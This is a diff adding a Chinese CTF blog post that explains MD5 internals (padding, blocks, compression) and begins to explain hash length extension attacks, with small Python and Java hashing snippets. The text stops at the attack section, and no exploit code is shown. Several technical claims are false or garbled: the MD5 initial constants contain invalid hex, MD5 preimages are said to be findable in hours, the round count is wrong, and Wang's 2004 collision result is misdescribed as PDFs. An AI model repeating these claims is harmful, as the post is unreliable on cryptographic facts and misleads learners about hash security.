@@ -1,0 +1,1135 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>深入浅出-Hash长度拓展攻击 - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="深入浅出-Hash长度拓展攻击" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-14T14:34:26+08:00" />
+<meta property="article:modified_time" content="2024-04-14T14:34:26+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="深入浅出-Hash长度拓展攻击"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" /><link rel="prev" href="http://ML-hacker.github.io/posts/ld_preload/" /><link rel="next" href="http://ML-hacker.github.io/posts/%E6%B5%85%E8%B0%88bashfuck/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "深入浅出-Hash长度拓展攻击",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"
+        },"genre": "posts","keywords": "Hash","wordcount":  1883 ,
+        "url": "http://ML-hacker.github.io/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/","datePublished": "2024-04-14T14:34:26+08:00","dateModified": "2024-04-14T14:34:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">深入浅出-Hash长度拓展攻击</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1883 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="0x00前言" class="headerLink">
+    <a href="#0x00%e5%89%8d%e8%a8%80" class="header-mark"></a>0x00前言</h1><p>因为kengwang师傅在新生赛出了这个题目，但是之前没学过www，这就来学学。</p>
+<h1 id="0x01-什么是hash长度拓展攻击" class="headerLink">
+    <a href="#0x01-%e4%bb%80%e4%b9%88%e6%98%afhash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb" class="header-mark"></a>0x01 什么是hash长度拓展攻击</h1><p>hash长度拓展攻击，概括一下就是由于hash的生成机制使得我们可以人为的在原先的明文基础上添加新的拓展字符，从而使得原本的加密链变长，进一步控制加密链的最后一节，使得我们得以控制最终的结果。<br>
+这里简单介绍一下hash算法。</p>
+<h2 id="hash算法" class="headerLink">
+    <a href="#hash%e7%ae%97%e6%b3%95" class="header-mark"></a>hash算法</h2><p>hash算法又叫做散列算法。是一种把任意长度的字符串加密为固定长度的字符串的加密算法，该算法生成的密文就是散列值。这里拿一个比较典型的MD5来做例子来详细分析一下</p>
+<h1 id="0x02md5加密" class="headerLink">
+    <a href="#0x02md5%e5%8a%a0%e5%af%86" class="header-mark"></a>0X02MD5加密</h1><h2 id="md5-introduction" class="headerLink">
+    <a href="#md5-introduction" class="header-mark"></a>MD5 introduction</h2><p><strong>MD5 消息摘要算法</strong>是一种广泛使用的哈希函数，可生成 128位哈希值。 MD5 由Ronald Rivest于 1991年设计，用于取代早期的哈希函数MD4 ，并于 1992 年被指定为 RFC 1321。</p>
+<p>MD5 可用作校验和来验证数据完整性，防止意外损坏。历史上它被广泛用作加密哈希函数；然而，它被发现存在广泛的漏洞。它仍然适用于其他非加密目的，例如用于确定分区数据库中特定密钥的分区，并且由于比最新的安全散列算法更低的计算要求，它可能是首选。</p>
+<h2 id="md5-proccess" class="headerLink">
+    <a href="#md5-proccess" class="header-mark"></a>MD5 proccess</h2><p>这里我将MD5加密分为三个步骤，分别是：</p>
+<ul>
+<li>填充</li>
+<li>分块</li>
+<li>多轮压缩
+最后输出，这里我一一举例</li>
+</ul>
+<h3 id="填充" class="headerLink">
+    <a href="#%e5%a1%ab%e5%85%85" class="header-mark"></a>填充</h3><p>这里我贴一下墨师傅的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">text_to_binary</span><span class="p">(</span><span class="n">text_str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">binary_str</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="s1">&#39;b&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">binary_str</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">text_input</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdef&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">binary_output</span> <span class="o">=</span> <span class="n">text_to_binary</span><span class="p">(</span><span class="n">text_input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;binary result is:</span><span class="si">{0}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">binary_output</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>具体的代码逻辑应该很清晰</p>
+<ul>
+<li>input是0-f</li>
+<li>将input转换为2进制内容
+这里的输出为</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00110000 00110001 00110010 00110011 00110100 00110101 00110110 00110111 00111000 00111001 01100001 01100010 01100011 01100100 01100101 01100110
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里便是128位的二进制字符
+或者我们可以用010来查看文件，这里举例
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/1.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/1.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/1.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/1.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/1.png"
+        title="/img/深入浅出-Hash长度拓展攻击/1.png" ></figure>
+这里就是9*8=72个二进制字符</p>
+<h4 id="填充的rule" class="headerLink">
+    <a href="#%e5%a1%ab%e5%85%85%e7%9a%84rule" class="header-mark"></a>填充的rule</h4><p><strong>什么叫填充呢，填充的过程就是讲2进制字符个数填充到512比特的整数倍大小，并且需要在最后面预留64位来固定表示原始数据大小，即小端在前格式，中间剩下的比特第一个填1其余的补0</strong></p>
+<p>那么对于以上的两个二进制文件，则就可以按照这个填充规则来进行填充。</p>
+<h4 id="疑问" class="headerLink">
+    <a href="#%e7%96%91%e9%97%ae" class="header-mark"></a>疑问？</h4><p>这里提出一个小问题，如果说你输入的数据刚好为512bit呢，那么他是否会进行填充，答案是肯定的，因为没有最后64位固定值来表示原始数据大小，那么就会填充到1024-512=512个数据（当然包含进最后64位固定数据）。
+包括在最后不足64位时也需要补齐到下一个512整数倍的数据。
+最后补的64位的值就是前面数据长度的大小，例如abcd，则就是4*8=32，转化成二进制就是100000。</p>
+<h3 id="分块" class="headerLink">
+    <a href="#%e5%88%86%e5%9d%97" class="header-mark"></a>分块</h3><p>那么在前面进行填充后肯定可以进行分块，并且分块肯定可以是512的整数倍。
+并且这个时候会给出四组幻数来作为md5的初始值
+例如
+0x1a8ba2ba 0x18s62abs 0x17ais27a2 0x1a662b1a</p>
+<h3 id="多轮压缩" class="headerLink">
+    <a href="#%e5%a4%9a%e8%bd%ae%e5%8e%8b%e7%bc%a9" class="header-mark"></a>多轮压缩</h3><p>过程：把当前的四组散列值各复制一份，分别用abcd来表示
+然后在每一个数据块中进行四轮操作，其中包含与，或，非，和循环位移操作，每次把abcd更新四次。
+所以每个大块都可以对abcd的值进行更新16次。</p>
+<p>这里我贴一个java实现md5加密的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.MessageDigest</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.NoSuchAlgorithmException</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MD5</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;Hello, World!&#34;</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">encryptToMD5</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Original String: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;MD5 Encrypted String: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">encrypted</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encryptToMD5</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">MessageDigest</span><span class="w"> </span><span class="n">md</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MessageDigest</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;MD5&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">md</span><span class="p">.</span><span class="na">update</span><span class="p">(</span><span class="n">input</span><span class="p">.</span><span class="na">getBytes</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">digest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">md</span><span class="p">.</span><span class="na">digest</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">digest</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&#34;%02x&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xff</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">sb</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">NoSuchAlgorithmException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="md5攻击" class="headerLink">
+    <a href="#md5%e6%94%bb%e5%87%bb" class="header-mark"></a>MD5攻击</h1><h2 id="第一原像攻击first-preimage-attack" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%80%e5%8e%9f%e5%83%8f%e6%94%bb%e5%87%bbfirst-preimage-attack" class="header-mark"></a>第一原像攻击（First Preimage Attack）</h2><p>第一原像攻击的目标是从给定的哈希值ℎh中找到相应的消息m，使得当这个消息被输入到哈希函数（例如MD5）时，会产生给定的哈希值ℎ。</p>
+<p>在MD5的上下文中，虽然找到第一原像的理论复杂度是O(2^128)（由于MD5生成128位的哈希值），但是由于MD5的安全性问题，实际上的攻击复杂度远低于理论值。例如，研究已经显示，使用现代硬件和算法，可以在几小时或几天内找到MD5的第一原像。</p>
+<h2 id="第二原像攻击second-preimage-attack" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%8c%e5%8e%9f%e5%83%8f%e6%94%bb%e5%87%bbsecond-preimage-attack" class="header-mark"></a>第二原像攻击（Second Preimage Attack）</h2><p>第二原像攻击的目标是对于给定的输入消息m1​，找到另一个不同的消息m2​，使得两个消息产生相同的哈希值。这意味着对于哈希值ℎ，存在两个不同的消息m1​和m2​满足：</p>
+<pre><code>MD5(m1​)=MD5(m2​)=h
+</code></pre>
+<p>同样，理论上，第二原像攻击的复杂度是O(2^128)，但由于MD5的弱点，实际攻击的复杂度比理论值低得多。尽管如此，相对于第一原像攻击，第二原像攻击仍然是一个更为困难的问题。</p>
+<h2 id="碰撞攻击" class="headerLink">
+    <a href="#%e7%a2%b0%e6%92%9e%e6%94%bb%e5%87%bb" class="header-mark"></a>碰撞攻击</h2><p>碰撞攻击是一种密码学攻击，目的是找到两个不同的输入消息（也称为原文），这两个消息在经过同一哈希函数计算后，会产生相同的哈希值。换句话说，攻击者试图找到两个不同的消息 m1​ 和 m2​，使得：</p>
+<p>hash(m1​)=hash(m2​)</p>
+<p>在MD5的上下文中，由于MD5哈希值为128位，理论上的碰撞攻击复杂度为O(2^128)。然而，由于MD5的设计缺陷和计算上的优化，现实中的碰撞攻击比这个理论复杂度要低得多。</p>
+<h3 id="example" class="headerLink">
+    <a href="#example" class="header-mark"></a>example</h3><p>2004年，Xiaoyun Wang等人发布了一个研究，成功地找到了两个不同的PDF文件，这两个文件在经过MD5哈希后产生了相同的哈希值。这是MD5碰撞攻击的早期和最著名的例子。</p>
+<p>具体来说，这项研究找到了两个PDF文件：一个是普通的合同文件，另一个是恶意的PDF文件，其中嵌入了攻击代码。当这两个文件经过MD5哈希后，它们产生了相同的128位哈希值。这意味着，对于MD5哈希值来说，这两个文件是不可区分的，尽管它们的内容截然不同。</p>
+<p>这个例子揭示了MD5在实际应用中的严重安全风险。如果攻击者能够找到一个合法文件和一个恶意文件，这两个文件的MD5哈希值相同，那么攻击者就可以轻易地伪装合法文件，诱使用户打开恶意文件，从而进行恶意攻击。</p>
+<p>由于MD5的这种弱点，现在强烈建议避免使用MD5进行任何安全相关的应用，而应选择更安全的哈希算法，如SHA-256或SHA-3。这些算法在当前时间（2022年1月之前）被认为是安全的，并且不容易受到碰撞攻击的威胁。</p>
+<h1 id="hash-长度拓展攻击" class="headerLink">
+    <a href="#hash-%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb" class="header-mark"></a>Hash 长度拓展攻击</h1><p><strong>可能我现在写的东西有点抽象，不过后面我会总结讲一下为什么要这么做以及他的原理</strong>
+这里定义一些东西</p>
+<ul>
+<li>let <code>secret = &quot;secret&quot;</code></li>
+<li>let <code>data = &quot;data&quot;</code></li>
+<li>let <code>H = md5()</code></li>
+<li>let <code>signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b</code></li>
+<li>let <code>append = &quot;append&quot;</code></li>
+</ul>
+<p>首先这里放出一个简单的example</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......
+</span></span><span class="line"><span class="cl">0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+</span></span><span class="line"><span class="cl">0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+</span></span><span class="line"><span class="cl">0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>代码模式可能看的不是很清晰，这里我贴出来图片
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/2.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/2.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/2.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/2.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/2.png"
+        title="/img/深入浅出-Hash长度拓展攻击/2.png" ></figure>
+当然这里是利用16进制来表示的，我们用二进制也是可以的，8-&gt;1，5-&gt;8bit。</p>
+<h2 id="attack" class="headerLink">
+    <a href="#attack" class="header-mark"></a>ATTACK</h2><p>这里我们将一个值，就是前面的append加入到字符串中，是这样的
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/3.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/3.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/3.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/3.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/3.png"
+        title="/img/深入浅出-Hash长度拓展攻击/3.png" ></figure></p>
+<p>此时，这个哈希值有两种计算方式（破题点，这个后面会好好解释一下可能这里比较抽象）</p>
+<ul>
